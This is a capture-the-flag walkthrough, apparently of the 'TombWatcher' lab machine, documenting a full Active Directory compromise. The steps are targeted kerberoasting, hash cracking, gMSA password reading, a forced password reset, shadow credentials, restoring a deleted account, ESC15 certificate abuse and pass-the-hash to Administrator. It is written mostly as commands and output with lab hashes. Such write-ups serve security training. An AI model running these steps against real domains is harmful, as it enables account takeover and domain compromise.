## TombWatcher

### Lab Details 

- Difficulty: Medium
- Type: Active Directory, Windows

#### Enumeration
- run `nmap`
```bash
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-title: IIS Windows Server
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-10-16 14:58:31Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.tombwatcher.htb
| Not valid before: 2025-10-16T14:48:57
|_Not valid after:  2026-10-16T14:48:57
|_ssl-date: 2025-10-16T15:00:05+00:00; +4h00m00s from scanner time.
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-10-16T15:00:04+00:00; +3h59m59s from scanner time.
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.tombwatcher.htb
| Not valid before: 2025-10-16T14:48:57
|_Not valid after:  2026-10-16T14:48:57
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-10-16T15:00:05+00:00; +4h00m00s from scanner time.
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.tombwatcher.htb
| Not valid before: 2025-10-16T14:48:57
|_Not valid after:  2026-10-16T14:48:57
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-10-16T15:00:04+00:00; +3h59m59s from scanner time.
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.tombwatcher.htb
| Not valid before: 2025-10-16T14:48:57
|_Not valid after:  2026-10-16T14:48:57
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49693/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49694/tcp open  msrpc         Microsoft Windows RPC
49696/tcp open  msrpc         Microsoft Windows RPC
49718/tcp open  msrpc         Microsoft Windows RPC
```
- given credential `henry / H3nry_987TGV!`
`enum4linux-ng` scan with credential
- found users via `RPC`
```bash
'1103':
  username: Henry
  name: (null)
  acb: '0x00000210'
  description: (null)
'1104':
  username: Alfred
  name: (null)
  acb: '0x00000210'
  description: (null)
'1105':
  username: sam
  name: (null)
  acb: '0x00000210'
  description: (null)
'1106':
  username: john
  name: (null)
  acb: '0x00000210'
  description: (null)
```
`nxc` enumerate for `smb` shares, no read access to shares as `henry`
```bash
$ nxc smb 10.129.39.0 -u henry -p 'H3nry_987TGV!' --shares
SMB         10.129.39.0     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:tombwatcher.htb) (signing:True) (SMBv1:False)
SMB         10.129.39.0     445    DC01             [+] tombwatcher.htb\henry:H3nry_987TGV! 
SMB         10.129.39.0     445    DC01             [*] Enumerated shares
SMB         10.129.39.0     445    DC01             Share           Permissions     Remark
SMB         10.129.39.0     445    DC01             -----           -----------     ------
SMB         10.129.39.0     445    DC01             ADMIN$                          Remote Admin
SMB         10.129.39.0     445    DC01             C$                              Default share
SMB         10.129.39.0     445    DC01             IPC$            READ            Remote IPC
SMB         10.129.39.0     445    DC01             NETLOGON        READ            Logon server share 
SMB         10.129.39.0     445    DC01             SYSVOL          READ            Logon server share 
```
`nxc` enumerate for `winrm`, no `winrm` access
```bash
$ nxc winrm 10.129.39.0 -u henry -p 'H3nry_987TGV!' 
WINRM       10.129.39.0     5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:tombwatcher.htb)
WINRM       10.129.39.0     5985   DC01             [-] tombwatcher.htb\henry:H3nry_987TGV!
```

![[overview bloodhound.png]]
#### Initial Foothold 
 - we see that user `henry` has `WriteSPN` access to user `alfred`
- we can perform a targeted `kerberoast` attack
```bash
$ ./bloodyAD.py -u henry -p 'H3nry_987TGV!' --host 10.129.39.0 set object ALFRED servicePrincipalName -v 'att/ck'
[+] ALFRED's servicePrincipalName has been updated
```

```bash
$ nxc ldap dc01.tombwatcher.htb -u henry -p 'H3nry_987TGV!' --kerberoasting - 
SMB         10.129.39.0     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:tombwatcher.htb) (signing:True) (SMBv1:False)
LDAP        10.129.39.0     389    DC01             [+] tombwatcher.htb\henry:H3nry_987TGV! 
LDAP        10.129.39.0     389    DC01             Bypassing disabled account krbtgt 
LDAP        10.129.39.0     389    DC01             [*] Total of records returned 1
LDAP        10.129.39.0     389    DC01             sAMAccountName: Alfred memberOf:  pwdLastSet: 2025-05-12 10:17:03.526670 lastLogon:<never>
LDAP        10.129.39.0     389    DC01             $krb5tgs$23$*Alfred$TOMBWATCHER.HTB$tombwatcher.htb/Alfred*$38a8b83be69c42e140e54a8ec97ed94e$a71081ae0087a52e8db3ea8a9d8586d09045686abba4f2d812ceedfd975e2cf0a44b7e5108a39de18bad570671e6c154074796a23a7e2ddf546ccfde04d7f28be66448e847df2c3ccb194abf3039eda246dfc596a4d5c226a631e4bbe40f1a87156b7520cb1fdfc23c98f32c617eee151d16d686dc25314e5a9e8c7e46203c29440b5b1d1ed699c8593092463c1c32717271c3baffe3b23899e540df25eba6b1876ef6148d5c97c22744f21f24dbb2ed8af25f38333443697348efdd0a3f27bc6ab8af5282496d82b3defee03f611074bc13e06cace4bebbdb2fecbcf2c29476be493d84e18db06c69a33dcb47626fd35ef89814d5b10776a574d068962d4fc5497f73e3b299766f462fc36717c6799268abc508f303e091b82298cab52a10b66ba93f5fa26b4b2e895ffe7e2d837339e4deaca036f29d71de031d2a3d70141332523c804fadf4ff6e5647d376b97d459357b1849ab5ae92dff529a2e75fbe7047ae63983fa34d1c4ebc619bb4cb97bdeb47bf48d7956f01d0e4e97321d2bd9e9f6d4d4411c9ea84bc667b84e11714d11f06326c2cc37ff5993dae1e1aee5a0f30955af73fbc73f5a77db92ade3c5568784414c5d8a97f9359fd7e349e1ed7297de696e5b3b3a0d5e326bb6995e03485d4433d76ddd21d9b24b6e55b2b2ec8986e1c38a0eae5ec6186cea220519aa1ff6e0b644fd11325547659cf277a1bf2a9d96a22c26a09f56ccba104f7967b697f49f7cb28ea1b2b5b5b9f52ef49ded435b1ac182bbcd1ad24793f93fed056f3b18d180ba920bca4b612e1907ee78d2f1b969a9701bc694ff18d39a8a86a26a9a3292b548e32e41470704469a4afb87b042205ab4fc4844cb4da39072b793c671a07c53d96d3e2f504dad045d700018d4eb030d9fb27cb6b0e8359c7ec2f730907a5ef5cad98f3a31e0acf3b207bbe8a026b6b05a0466b8302ffa0fdf9b841fab3e4d148228052c59c8f6e845ab31e0c858a2890bdc8edd48212f2b9afbd0ba366fe931b97f991934642b99c5a26063b28c75b8c0fcbbd98068af0a6b12c16d749578df3d9690128a65bde2afe2bdbd73e90673f54a3195e68b29b17ec460cf809273e08ff0c9f78827dcf41d044aaa70eddd76621bf5a615221cec5d50c22efba3a17d7a67b43ddef325c0e8e8b45057c0c47a69faef32dcba86ef7740a429598c370bca25331ed9ab43e93ccff8201bbe63ccc0ecf20638f577bfdf491dce55b4a6d16ad09736e32c383d62a6aa18c94e53ee477b5749b09241727ba596e1bacf267293cbed490917356f9675fbfb9b1c52bb090ad0e2ad0ee527f433530b2e311600c4cd7aa1ee448b4e0489774ab4d9863de44ff1767a58258c158236a9ed04bd00e8d68dceb04223fc1dc62165dc2616f5ec057dc0d1bfcc509384e601555b89c669b857ded1b193c3d0c924cac0dbe82991ec9340fc7232fd5a7d8d9a4e7d3722ecd37
```
- crack with `hashcat`
```
$ hashcat -m 13100 alfred.hash /usr/share/wordlists/rockyou.txt
```
- we get password `basketball`
- as user `alfred` we can `addself` to the `infrastructure` group
![[alfred to infra.png]]
- we can add user `Alfred` to the `infrastructure` group refer to [this article](https://www.hackingarticles.in/addself-active-directory-abuse/)
```bash
$ ./bloodyAD.py --host "10.129.39.0" -d "tombwatcher.htb" -u "alfred" -p "basketball" add groupMember "infrastructure" "alfred"
[+] alfred added to infrastructure
```
- check group member, we can see `alfred` is added to the group
```bash
$ net rpc group members "infrastructure" -U tombwatcher.htb/alfred%'basketball' -S 10.129.39.0 
TOMBWATCHER\Alfred
```
- once we have added `alfred` to `infrastructure` group we can then use the `ReadGMSAPassword` privileged to get password hash of machine account `ansible_dev$` 
- **NOTE** be aware of the casing adding `alfred` will not work need to add as `Alfred`
- use `nxc` to read the `ntlm` hash of `ANSIBLE_DEV$` as `alfred`
```bash
$ nxc ldap tombwatcher.htb -u alfred -p basketball --gmsa
SMB         10.129.39.0     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:tombwatcher.htb) (signing:True) (SMBv1:False)
LDAPS       10.129.39.0     636    DC01             [+] tombwatcher.htb\alfred:basketball 
LDAPS       10.129.39.0     636    DC01             [*] Getting GMSA Passwords
LDAPS       10.129.39.0     636    DC01             Account: ansible_dev$         NTLM: bf8b11e301f7ba3fdc616e5d4fa01c30
```
- enumerate further through `bloodhound`
- we see that machine account `ANSIBLE_DEV$` has `ForceChangePassword` privilege access over user `sam`
![[ansible to sam.png]]
- we can change user `sam` using `bloodyAD`
- first we need `TGT` of `ANSIBLE_DEV$`
```bash
$ impacket-getTGT tombwatcher.htb/'ansible_dev$' -hashes 00000000000000000000000000000000:bf8b11e301f7ba3fdc616e5d4fa01c30
```
- then change the password using `bloodyAD`
```bash
$ export KRB5CCNAME=./'ansible_dev$.ccache'; python3 ../bloodyAD.py -d tombwatcher.htb -k --host "dc01.tombwatcher.htb" set password "Sam" 'password123!'
[+] Password changed successfully!
```
- use `nxc` to check password update
```bash
## use nxc to check password change
$ nxc smb 10.129.39.0 -u Sam -p 'password123!' 
SMB         10.129.39.0     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:tombwatcher.htb) (signing:True) (SMBv1:False)
SMB         10.129.39.0     445    DC01             [+] tombwatcher.htb\Sam:password123!
```
- working along we see that `Sam` has `WriteOwner` access to user `John`
![[sam to john.png]]
- we can exploit the privilege by adding shadow password to `john`
```bash
$ certipy shadow auto -u sam@tombwatcher.htb -p 'password123!' -account john -dc-ip 10.129.39.0
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Targeting user 'john'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID 'b582eb71-873a-3804-6674-26fc4435175a'
[*] Adding Key Credential with device ID 'b582eb71-873a-3804-6674-26fc4435175a' to the Key Credentials for 'john'
[*] Successfully added Key Credential with device ID 'b582eb71-873a-3804-6674-26fc4435175a' to the Key Credentials for 'john'
/usr/local/lib/python3.11/dist-packages/certipy/lib/certificate.py:233: CryptographyDeprecationWarning: Parsed a serial number which wasn't positive (i.e., it was negative or zero), which is disallowed by RFC 5280. Loading this certificate will cause an exception in a future release of cryptography.
  return x509.load_der_x509_certificate(certificate)
[*] Authenticating as 'john' with the certificate
[*] Using principal: john@tombwatcher.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'john.ccache'
[*] Trying to retrieve NT hash for 'john'
[*] Restoring the old Key Credentials for 'john'
[*] Successfully restored the old Key Credentials for 'john'
[*] NT hash for 'john': ad9324754583e3e42b55aad4d3b8d2bf
```
- we can get reverse shell access as `john` using the `nt` hash
```bash
$ evil-winrm -i 10.129.39.0 -u john -H ad9324754583e3e42b55aad4d3b8d2bf
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\john\Documents>
```
#### Lateral Movement (If any)

#### Privilege Escalation
- we see that user `john` has `GenericAll` access over `ADCS OU`
![[john to adcs.png]]
- look for deleted objects in the `OU` and found user `cert_admin`
```powershell
*Evil-WinRM* PS C:\Users\john\Desktop> Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects -Properties objectSid,lastKnownParent | Where-Object {$_.lastKnownParent -eq "OU=ADCS,DC=TOMBWATCHER,DC=HTB"}


Deleted           : True
DistinguishedName : CN=cert_admin\0ADEL:f80369c8-96a2-4a7f-a56c-9c15edd7d1e3,CN=Deleted Objects,DC=tombwatcher,DC=htb
LastKnownParent   : OU=ADCS,DC=tombwatcher,DC=htb
Name              : cert_admin
                    DEL:f80369c8-96a2-4a7f-a56c-9c15edd7d1e3
ObjectClass       : user
ObjectGUID        : f80369c8-96a2-4a7f-a56c-9c15edd7d1e3
objectSid         : S-1-5-21-1392491010-1358638721-2126982587-1109

Deleted           : True
DistinguishedName : CN=cert_admin\0ADEL:c1f1f0fe-df9c-494c-bf05-0679e181b358,CN=Deleted Objects,DC=tombwatcher,DC=htb
LastKnownParent   : OU=ADCS,DC=tombwatcher,DC=htb
Name              : cert_admin
                    DEL:c1f1f0fe-df9c-494c-bf05-0679e181b358
ObjectClass       : user
ObjectGUID        : c1f1f0fe-df9c-494c-bf05-0679e181b358
objectSid         : S-1-5-21-1392491010-1358638721-2126982587-1110

Deleted           : True
DistinguishedName : CN=cert_admin\0ADEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf,CN=Deleted Objects,DC=tombwatcher,DC=htb
LastKnownParent   : OU=ADCS,DC=tombwatcher,DC=htb
Name              : cert_admin
                    DEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf
ObjectClass       : user
ObjectGUID        : 938182c3-bf0b-410a-9aaa-45c8e1a02ebf
objectSid         : S-1-5-21-1392491010-1358638721-2126982587-1111
```
- attempt to restore user `cert_admin`
```powershell
Restore-ADObject -Identity "938182c3-bf0b-410a-9aaa-45c8e1a02ebf"
```
- get hash by adding shadow password to `cert_admin`
```powershell
$ certipy shadow auto -u john@tombwatcher.htb -hashes 'ad9324754583e3e42b55aad4d3b8d2bf' -account cert_admin -dc-ip 10.129.39.0
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Targeting user 'cert_admin'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID '72f5b7fe-8ab0-6ad1-9c3a-a58311559d21'
[*] Adding Key Credential with device ID '72f5b7fe-8ab0-6ad1-9c3a-a58311559d21' to the Key Credentials for 'cert_admin'
[*] Successfully added Key Credential with device ID '72f5b7fe-8ab0-6ad1-9c3a-a58311559d21' to the Key Credentials for 'cert_admin'
[*] Authenticating as 'cert_admin' with the certificate
[*] Using principal: cert_admin@tombwatcher.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'cert_admin.ccache'
[*] Trying to retrieve NT hash for 'cert_admin'
[*] Restoring the old Key Credentials for 'cert_admin'
[*] Successfully restored the old Key Credentials for 'cert_admin'
[*] NT hash for 'cert_admin': f87ebf0febd9c4095c68a88928755773
```
- after we have retrieved `cert_admin`'s hash we can then check for misconfigurations on `ADCS` 
```bash
$ certipy-ad  find -u cert_admin -hashes f87ebf0febd9c4095c68a88928755773 -dc-ip 10.129.232.167 -stdout -vulnerable 
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates
[*] Finding issuance policies
[*] Found 13 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'tombwatcher-CA-1' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Successfully retrieved CA configuration for 'tombwatcher-CA-1'
[*] Checking web enrollment for CA 'tombwatcher-CA-1' @ 'DC01.tombwatcher.htb'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : tombwatcher-CA-1
    DNS Name                            : DC01.tombwatcher.htb
    Certificate Subject                 : CN=tombwatcher-CA-1, DC=tombwatcher, DC=htb
    Certificate Serial Number           : 3428A7FC52C310B2460F8440AA8327AC
    Certificate Validity Start          : 2024-11-16 00:47:48+00:00
    Certificate Validity End            : 2123-11-16 00:57:48+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : TOMBWATCHER.HTB\Administrators
      Access Rights
        ManageCa                        : TOMBWATCHER.HTB\Administrators
                                          TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        ManageCertificates              : TOMBWATCHER.HTB\Administrators
                                          TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Enroll                          : TOMBWATCHER.HTB\Authenticated Users
Certificate Templates
  0
    Template Name                       : WebServer
    Display Name                        : Web Server
    Certificate Authorities             : tombwatcher-CA-1
    Enabled                             : True
    Client Authentication               : False
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Extended Key Usage                  : Server Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 2 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-11-16T00:57:49+00:00
    Template Last Modified              : 2024-11-16T17:07:26+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
                                          TOMBWATCHER.HTB\cert_admin
      Object Control Permissions
        Owner                           : TOMBWATCHER.HTB\Enterprise Admins
        Full Control Principals         : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Owner Principals          : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Dacl Principals           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Property Enroll           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
                                          TOMBWATCHER.HTB\cert_admin
    [+] User Enrollable Principals      : TOMBWATCHER.HTB\cert_admin
    [!] Vulnerabilities
      ESC15                             : Enrollee supplies subject and schema version is 1.
    [*] Remarks
      ESC15                             : Only applicable if the environment has not been patched. See CVE-2024-49019 or the wiki for more details.
```
- target is vulnerable to `ESC15` 
- we can exploit it using below method
```bash
## vulnerable template WebServer
$ certipy-ad req -u cert_admin -hashes f87ebf0febd9c4095c68a88928755773 -dc-ip 10.129.232.167 -target dc01.tombwatcher.htb -ca tombwatcher-CA-1 -template WebServer -upn administrator@tombwatcher.htb -application-policies 'Certificate Request Agent' 
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 4
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator@tombwatcher.htb'
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'

$ certipy-ad req -u cert_admin -hashes f87ebf0febd9c4095c68a88928755773 -dc-ip 10.129.232.167 -target dc01.tombwatcher.htb -ca tombwatcher-CA-1 -template User -pfx administrator.pfx -on-behalf-of 'tombwatcher\Administrator' 
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 5
[*] Successfully requested certificate
[*] Got certificate with UPN 'Administrator@tombwatcher.htb'
[*] Certificate object SID is 'S-1-5-21-1392491010-1358638721-2126982587-500'
[*] Saving certificate and private key to 'administrator.pfx'
File 'administrator.pfx' already exists. Overwrite? (y/n - saying no will save with a unique filename): cert_admin
[*] Wrote certificate and private key to 'administrator_fa56b4f6-11ee-4c73-8299-1f4f7bbd1887.pfx'

$ certipy auth -pfx administrator_fa56b4f6-11ee-4c73-8299-1f4f7bbd1887.pfx -dc-ip 10.129.232.167
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: administrator@tombwatcher.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@tombwatcher.htb': aad3b435b51404eeaad3b435b51404ee:f61db423bebe3328d33af26741afe5fc
```
- get admin access using admin's hash via `evil-winrm`
```bash
$ evil-winrm -i dc01.tombwatcher.htb -u administrator -H f61db423bebe3328d33af26741afe5fc
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```

#### Resources

#### Lesson Learned
